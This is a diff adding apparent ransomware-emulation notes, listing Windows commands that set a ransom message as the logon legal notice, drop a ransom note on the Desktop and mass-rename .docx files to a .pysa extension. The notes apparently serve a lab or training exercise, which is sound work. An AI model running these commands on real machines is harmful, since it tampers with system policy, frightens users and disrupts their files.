@@ -1,0 +1,17 @@
+Here is the content of the file they were copying and pasting from:
+1. Commands to run on Windows to see current settings.
+-Open a Powershell prompt.
+--View Documents for ransomware test:
+dir -Recurse c:\Users\champlain\Documents
+-- View current restore points:
+Get-ComputerRestorePoint
+
+2. Setting Legal Warning abilities Text (Note that the commands are separated by a semicolon in order to run multiple commands):
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "legalnoticetext" -Value "Information is on the Desktop to get your data.  We are looking forward to working together." ; Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "legalnoticecaption" -Value "YOUR DATA IS ENCRYPTED !"
+
+3. Creating README.READ on the Desktop and changing file association abilitiy (Note the commands are separated by double ampersands to run multiple commands):
+echo Your data is encrypted.  Contact us to get your data back! > Desktop\README.READ  && assoc .READ=txtfile
+
+4. Simulate Ransomware ability text:
+get-childitem C:\Users\champlain\Documents -Filter "*docx*" -Recurse | rename-item -NewName {$_.name -replace 'docx','pysa' }
+
